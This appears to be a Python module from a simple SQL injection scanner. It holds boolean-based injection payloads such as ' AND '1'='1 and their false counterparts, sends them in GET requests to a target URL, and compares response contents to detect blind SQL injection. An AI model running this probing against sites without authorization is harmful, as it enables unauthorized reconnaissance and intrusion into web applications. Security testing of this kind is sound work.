from url_utils import construct_test_url
from response_analyzer import analyze_response
import requests

# SQL injection payloads for testing
test_1_payloads = [" AND 1=1", "' AND '1'='1", '" AND "1"="1']
test_2_payloads = [" AND 1=2", "' AND '1'='2", '" AND "1"="2']


# Function to send SQL payloads and receive the response
def send_payload(target_url):
    response = requests.get(target_url)
    return response.text


# Function to test SQL injection
def test_sql_injection(target_url, id_value):
    print(f"\nTesting default request: {target_url}")
    default_response = send_payload(target_url)
    print("Default response length:", len(default_response))

    # Test 1: True conditions
    print("\nTesting with True conditions (Test 1):")
    true_responses = []  # To store true responses for further comparison
    for payload in test_1_payloads:
        new_url = construct_test_url(target_url, id_value, payload)
        response = send_payload(new_url)
        analyze_response(default_response, response, payload)
        true_responses.append(response)  # Store the response for true conditions

    # Test 2: False conditions
    print("\nTesting with False conditions (Test 2):")
    for payload in test_2_payloads:
        new_url = construct_test_url(target_url, id_value, payload)
        response = send_payload(new_url)

        # Ensure false condition responses differ from both default and true condition responses
        if any(response == true_response for true_response in true_responses):
            print(f"Payload '{payload}' produced a similar response to true conditions (unexpected result).")
        else:
            analyze_response(default_response, response, payload)
